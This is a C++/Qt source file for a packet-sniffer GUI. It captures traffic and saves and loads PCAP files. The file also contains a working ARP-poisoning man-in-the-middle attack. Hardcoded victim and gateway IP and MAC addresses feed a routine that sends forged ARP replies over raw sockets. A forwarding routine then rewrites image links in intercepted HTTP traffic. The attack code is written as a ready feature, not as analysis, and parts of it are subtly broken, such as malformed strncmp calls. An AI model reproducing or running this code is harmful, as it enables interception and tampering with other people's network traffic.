#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "Sniffer.h"
#include "dialoginterface.h"
#include <QFileDialog>
#include <cstdlib>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ui->pb_scroll->setCheckable(true);
    ui->tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);
    client1 = NULL;
    client2 = NULL;
    counter = 0;

    thread = new QThread();
    sniffer = new Sniffer();
    sniffer->moveToThread(thread);

    QTimer *timer = new QTimer(this);
    timer->setInterval(50);
    timer->start(100);
    connect(thread, SIGNAL(started()), sniffer, SLOT(Start()));
    connect(timer, SIGNAL(timeout()), this, SLOT(getNewPackets()));

    connect(ui->pb_sniff, SIGNAL(clicked()), this, SLOT(ToggleSniffer()));
    connect(ui->pb_clear, SIGNAL(clicked()), this, SLOT(Clear()));
    connect(ui->pb_load, SIGNAL(clicked()), this, SLOT(Load()));
    connect(ui->pb_save, SIGNAL(clicked()), this, SLOT(Save()));

#ifdef __linux__
    connect(ui->pb_arp, SIGNAL(clicked()), this, SLOT(ArpPoisoning()));
#endif
}

MainWindow::~MainWindow()
{
    delete ui;
}

void    MainWindow::Clear()
{
    sniffer->mutex.lock();
    ui->tableWidget->clearContents();
    ui->tableWidget->setRowCount(0);
    for (std::list<SniffedPacket *>::iterator it = sniffer->Packets.begin(); it != sniffer->Packets.end(); it++)
        delete *it;
    sniffer->Packets.clear();
    for (std::list<SniffedPacket *>::iterator it = this->Packets.begin(); it != this->Packets.end(); it++)
        delete *it;
    this->Packets.clear();
    sniffer->mutex.unlock();
}

void    MainWindow::getNewPackets()
{
    if (counter++ == 20)
    {
        counter = 0;
        this->refreshArp();
    }

    sniffer->mutex.lock();

    for (std::list<SniffedPacket *>::iterator it = sniffer->Packets.begin(); it != sniffer->Packets.end(); it++)
    {
        checkArp(*(*it));
        insertPacket(*(*it));
    }

    sniffer->Packets.clear();
    if (ui->pb_scroll->isChecked())
        ui->tableWidget->scrollToBottom();

    sniffer->mutex.unlock();
}

void    MainWindow::insertPacket(SniffedPacket &packet)
{
    int i = ui->tableWidget->rowCount();
    ui->tableWidget->insertRow(i);

    insertToIndex(packet.ip_source.c_str(), i, 0);
    insertToIndex(packet.ip_dest.c_str(), i, 1);
    insertToIndex(QString::number(packet.size), i, 2);
    insertToIndex(packet.protocol, i, 3);
    insertToIndex(packet.info, i, 4);

    this->Packets.push_back(&packet);
}

void    MainWindow::insertToIndex(const QString &str, int row, int col)
{
    QTableWidgetItem *item = new QTableWidgetItem(str);
    item->setFlags(Qt::ItemIsSelectable | Qt::ItemIsEnabled);
    if (col != 4)
        item->setTextAlignment(Qt::AlignCenter);
    ui->tableWidget->setItem(row, col, item);
}

void                MainWindow::StartSniffing(const std::string &interface)
{
    this->interface = interface;
    sniffer->Initialize(interface);
    thread->start();
    ui->pb_sniff->setText("STOP");
}

void                MainWindow::ToggleSniffer()
{
    if (this->sniffer->IsSniffing())
    {
        this->sniffer->Stop();
        if (!thread->wait(500))
        {
            thread->terminate();
            thread->wait();
        }
        this->sniffer->DeInitialize();
        ui->pb_sniff->setText("START");
        if (client1 != NULL)
        {
            delete client1;
            delete client2;
            client1 = NULL;
        }

        return ;
    }

    DialogInterface win(this);
    win.exec();
}

void                  MainWindow::Save()
{
    if (this->sniffer->IsSniffing())
        ToggleSniffer();

    QString           fileName = QFileDialog::getSaveFileName(this, tr("Save File"), "", tr("PCAP (*.pcap)"));

    std::ofstream file(fileName.toStdString(), std::ios::binary | std::ios::trunc | std::ios::out);
    if (file.is_open())
    {
        pcap_hdr_t	hdr;
        std::memset((char *) &hdr, 0, sizeof(hdr));
        hdr.magic_number = 0xA1B2C3D4;
        hdr.version_major = 2;
        hdr.version_minor = 4;
        hdr.snaplen = 65535;
        hdr.network = 1;
        file.write((char *) &hdr, sizeof(hdr));

        pcaprec_hdr_t hdrp;
        std::memset(&hdrp, 0, sizeof(hdrp));
        eth_hdr_t eth_hdr;
        eth_hdr.ether_type = 8;
        for (std::list<SniffedPacket *>::iterator it = this->Packets.begin(); it != this->Packets.end(); it++)
        {
            hdrp.incl_len = (*it)->size;
            if (!(*it)->has_ether_hdr)
                hdrp.incl_len += ETHER_HDR_SIZE;
            hdrp.orig_len = hdrp.incl_len;

            file.write((char *) &hdrp, sizeof(hdrp));
            if (!(*it)->has_ether_hdr)
                file.write((char *) &eth_hdr, ETHER_HDR_SIZE);
            file.write((*it)->data, (*it)->size);
        }

        file.close();
    }
    else
        qDebug() << "Unable to open file";
}

void                  MainWindow::Load()
{
  if (this->sniffer->IsSniffing())
      ToggleSniffer();

  Clear();

  QString           fileName = QFileDialog::getOpenFileName(this, tr("Load File"), "", tr("PCAP (*.pcap)"));
  std::streampos    size;
  char              *memblock;

  std::ifstream file(fileName.toStdString(), std::ios::in | std::ios::binary | std::ios::ate);
  if (file.is_open())
  {
    size = file.tellg();
    memblock = new char [size];
    file.seekg (0, std::ios::beg);
    file.read (memblock, size);
    file.close();

    pcap_hdr_t	&hdr = *(pcap_hdr_t *) memblock;
    if (hdr.magic_number != 0xa1b2c3d4)
    {
        qDebug() << "Wrong format";
        return ;
    }

    char *cursor = memblock + sizeof(hdr);
    pcaprec_hdr_t *hdrp;

    while ((int) (cursor - memblock) < size)
    {
      hdrp = (pcaprec_hdr_t *) cursor;

      cursor += sizeof(*hdrp);
      char  *data = cursor;

      Sniffer::ManagePacket(data, hdrp->incl_len, true);
      cursor += hdrp->incl_len;
    }

    delete[] memblock;
  }
  else
      qDebug() << "Unable to open file";
}

void                MainWindow::ArpPoisoning()
{
    mac[0] = 0x60;
    mac[1] = 0x67;
    mac[2] = 0x20;
    mac[3] = 0x1a;
    mac[4] = 0xc7;
    mac[5] = 0xd0;

    client_t    *client = new client_t;
    client->ip = "192.168.43.123";
    client->mac[0] = 0x60;
    client->mac[1] = 0x67;
    client->mac[2] = 0x20;
    client->mac[3] = 0x1a;
    client->mac[4] = 0xa2;
    client->mac[5] = 0xfc;
    client1 = client;
    client = new client_t;
    client->ip = "192.168.43.1";
    client->mac[0] = 0x98;
    client->mac[1] = 0x0c;
    client->mac[2] = 0x82;
    client->mac[3] = 0xb0;
    client->mac[4] = 0xd7;
    client->mac[5] = 0x68;
    client2 = client;

    ip = "192.168.43.32";
}

void            MainWindow::refreshArp()
{
#ifdef __linux__
    if (client1 == NULL || client2 == NULL || !this->sniffer->IsSniffing())
        return;

    int                 sock;
    char                packet[PKTLEN];
    struct ether_header *eth = (struct ether_header *) packet;
    struct ether_arp    *arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
    struct sockaddr_ll  device;

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0)
        qDebug() << "fail socket";

    client_t    *client = client1;
    for (int i = 0; i < 2; ++i)
    {
        // To
        sscanf((client == client1 ? client2->ip : client1->ip).c_str(), "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
                                       (int *) &arp->arp_spa[1],
                                       (int *) &arp->arp_spa[2],
                                       (int *) &arp->arp_spa[3]);
        // From
        std::memcpy(arp->arp_tha, client->mac, 6);
        // By
        std::memcpy(arp->arp_sha, mac, 6);

        memcpy(eth->ether_dhost, arp->arp_tha, ETH_ALEN);
        memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
        eth->ether_type = htons(ETH_P_ARP);

        arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
        arp->ea_hdr.ar_pro = htons(ETH_P_IP);
        arp->ea_hdr.ar_hln = ETH_ALEN;
        arp->ea_hdr.ar_pln = IP4LEN;
        arp->ea_hdr.ar_op = htons(ARPOP_REPLY);

        memset(&device, 0, sizeof(device));
        device.sll_ifindex = if_nametoindex(this->interface.c_str());
        device.sll_family = AF_PACKET;
        memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
        device.sll_halen = htons(ETH_ALEN);

        sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device));
        client = client2;
    }

    ::close(sock);
#endif
}

void    MainWindow::checkArp(SniffedPacket &packet)
{
    if (client1 == NULL || client2 == NULL || !packet.has_ether_hdr)
        return;

    QByteArray array = QByteArray(packet.data + 6, 6);
    QByteArray array2 = QByteArray(mac, 6);

    eth_hdr_t *eth = (eth_hdr_t *) packet.data;
    if (strncmp(eth->ether_dhost, mac, 6))
        return;

    if (packet.ip_dest == ip || packet.ip_source == ip || !(strncmp(eth->ether_shost, client1->mac) || strncmp(eth->ether_shost, client2->mac)))
        return ;
//    if (!(client1->ip == packet.ip_source && client2->ip == packet.ip_dest) &&
//            !(client2->ip == packet.ip_source && client1->ip == packet.ip_dest))
//        return;

    int                  sd;
    struct sockaddr_in   sin;
    int                  one = 1;
    const int            *val = &one;

    sd = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd < 0)
        return;

    IP_HDR  *ip = (IP_HDR *) (packet.data + ETHER_HDR_SIZE);

    sin.sin_family = AF_INET;
    sin.sin_port = 0;
    sin.sin_addr.s_addr = ip->ip_destaddr;

    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *) val, sizeof(one)) < 0)
        return;

    // Image replace
    std::string data(packet.data, packet.size);
    if (packet.protocol == "TCP" && packet.dport == 80)
    {
        std::string tofind("img src=");
        std::string toreplace("img src=\"http://upload.wikimedia.org/wikipedia/fr/f/fb/C-dans-l'air.png\"");
        std::size_t index;


        while ((index = data.find(tofind)) != std::string::npos)
        {
            packet.size += toreplace.length() - tofind.length();
            data.replace(index, tofind.length(), toreplace);
        }
    }

 #ifdef _WIN32
    sendto(sd, data.c_str(), packet.size, 0, (struct sockaddr *)&sin, sizeof(sin));
    closesocket(sd);
 #elif __linux__
    sendto(sd, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
    ::close(sd);
 #endif
}
